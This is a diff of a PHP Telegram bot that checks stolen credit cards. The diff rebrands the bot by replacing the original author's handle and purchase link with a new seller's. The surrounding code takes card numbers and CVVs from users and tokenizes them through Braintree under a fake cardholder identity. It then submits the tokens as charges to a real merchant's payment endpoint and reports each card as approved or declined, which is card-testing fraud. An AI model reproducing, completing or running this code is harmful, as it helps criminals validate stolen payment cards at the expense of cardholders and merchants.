@@ -1,7 +1,7 @@
 <?php
 if(strpos($message, '!btu') === 0 or strpos($message, '/btu') === 0 or strpos($message, '.btu') === 0){
     $keyboard = [
-    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
+    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/ANDREAYT02'],]]];
 $keyboard = json_encode($keyboard);
 checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
 $starttime = microtime(true);
@@ -105,7 +105,7 @@ mysqli_close($link);
     reply_to($chatId,$message_id,$keyboard,$antispam);
     exit();
     }
-$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 $respon = json_decode($sss, TRUE);
 $message_id_1 = $respon['result']['message_id'];
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -175,7 +175,7 @@ curl_close($ch);
     edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
     exit();
     }
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 
 
 
@@ -229,7 +229,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"394da68b-fc47-4c76-83b8-8f3f817307b2"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"Alsn Leno","billingAddress":{"company":"","countryName":"United States","extendedAddress":"addressGuid : 11edce34-72d8-4784-ba1d-a1e0cb085d21, regionGuid: 8f21c5b9-33af-4acc-a4b1-eb93b6163e67, countryGuid: 80533730-cab7-4c17-b509-5e6ce6b5ad00","locality":"Montpelier","region":"Vermont","firstName":"Alsn","lastName":"Leno","postalCode":"05602-4501","streetAddress":"31 Stretchs Way"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
  $curl = curl_exec($ch);
  $token = trim(strip_tags(getStr($curl,'token":"','"')));
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://www.printerpix.com/cart/api/paymentByBraintree');
@@ -264,7 +264,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, '{"nonce":"'.$token.'","amount":"41.47","Or
  $prorestext = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'processorResponseType":"','"')))));
  $vbv = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getStr($curl1,'threeDSecureInfo":',',')))));
 curl_close($ch);
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 $cod = array(1000,1002,1003,1004);
 if (in_array($code, $cod)){
   $msg = 'Approved ✅';
@@ -285,7 +285,7 @@ sendMessage1($result);
 sendMessage1($list);
 $result = urlencode("<b>
 GATE --> <i>BRAINTREE</i>
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@ANDREAYT02</code>
 Result ->> Unknown error
 Message ->> Try Again
 AVSP ->> .. || AVSS ->> ..
@@ -307,7 +307,7 @@ exit();
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@r0ld3x</code></b>");
+edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANDREAYT02</code></b>");
 
 
 $link = mysqli_connect("localhost", "root", "", "demo");
@@ -329,7 +329,7 @@ mysqli_close($link);
 
 $result = urlencode("<b>
 GATE --> <i>BRAINTREE</i>
-CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
+CC ->> <code>$cc|$mes|$ano|$cvv|@ANDREAYT02</code>
 Result ->> $status
 Message ->> $msg
 AVSP ->> $avsp || AVSS ->> $avss
